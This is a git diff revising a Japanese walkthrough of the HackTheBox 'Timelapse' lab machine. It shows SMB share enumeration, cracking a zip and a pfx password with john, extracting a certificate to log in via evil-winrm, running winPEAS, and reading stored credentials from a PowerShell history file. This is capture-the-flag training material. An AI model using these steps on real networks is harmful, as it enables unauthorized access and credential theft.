@@ -40,7 +40,7 @@ SMB         10.129.227.113  445    DC01             NETLOGON                    
 SMB         10.129.227.113  445    DC01             Shares          READ            
 SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share 
 ```
-sharesにアクセス、zipファイルをダウンロード
+shares内を列挙、クレデンシャルっぽいzipファイルをダウンロード
 ```sh
 └─$ netexec smb 10.129.227.113 -u ' ' -p '' --share 'Shares' -M spider_plus
 SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False) 
@@ -117,10 +117,10 @@ zipにパスワードあり、クラック成功
 ```sh
 └─$ unzip winrm_backup.zip 
 Archive:  winrm_backup.zip
-[Dev\winrm_backup.zip] legacyy_dev_auth.pfx password:
+[winrm_backup.zip] legacyy_dev_auth.pfx password:
 
 └─$ zip2john winrm_backup.zip > zip.txt                                    
-ver 2.0 efh 5455 efh 7875 Dev\winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
+ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
 
 └─$  john --wordlist=/usr/share/wordlists/rockyou.txt --format=PKZIP zip.txt 
 Created directory: /home/kali/.john
@@ -134,14 +134,14 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
 zip解凍、pfxファイルを入手  
-pfxからpemファイルに変換を試みたがここでもパスワードあり
+pfxから証明書ファイルに変換を試みたがここでもパスワードあり
 ```sh
 └─$ unzip winrm_backup.zip
 Archive:  winrm_backup.zip
 [winrm_backup.zip] legacyy_dev_auth.pfx password: 
   inflating: legacyy_dev_auth.pfx
 
-└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out publicCert.pem
+└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt
 Enter Import Password:
 ```
 クラック成功
@@ -169,14 +169,14 @@ Enter Import Password:
 └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out privkey.pem -nodes   
 Enter Import Password:
 
-└─$ ls -l publicCert.pem priv-key.pem
--rw------- 1 kali kali 1952 Sep 28 08:42 priv-key.pem
--rw------- 1 kali kali 1232 Sep 28 08:41 publicCert.pem
+└─$ ls -l cert.crt privkey.pem
+-rw------- 1 kali kali 1952 Sep 28 08:42 privkey.pem
+-rw------- 1 kali kali 1232 Sep 28 08:41 cert.crt
 ```
 winrmでログイン成功！  
 ユーザフラグゲット
 ```sh
-└─$ evil-winrm -S -c publicCert.pem -k priv-key.pem -r timelapse.htb -i 10.129.227.113
+└─$ evil-winrm -S -c cert.crt -k privkey.pem -r timelapse.htb -i 10.129.227.113
                                         
 Evil-WinRM shell v3.7
                                         
@@ -194,7 +194,7 @@ Info: Establishing connection to remote endpoint
 
 
 ## STEP 3
-winpeasを回す
+winpeasでシステム情報を列挙
 ```sh
 └─$ cp /usr/share/peass/winpeas/winPEASx64.exe .
 
@@ -519,6 +519,20 @@ You are NOT inside a container
        |                                 Thank you!                                      |                                                                                                                                                  
        \---------------------------------------------------------------------------------/   
 ```
+powershellの履歴ファイルを発見
+```sh
+ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.1.17763.1
+    PowerShell Core Version: 
+    Transcription Settings: 
+    Module Logging Settings: 
+    Scriptblock Logging Settings: 
+    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    PS history size: 434B
+```
+履歴ファイルを確認すると「svc_deploy」のクレデンシャルを確認  
+コマンドを見る感じ、このクレデンシャルでwinrm接続できそう
 ```powershell
 *Evil-WinRM* PS C:\Users\legacyy\Documents> cat C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 whoami
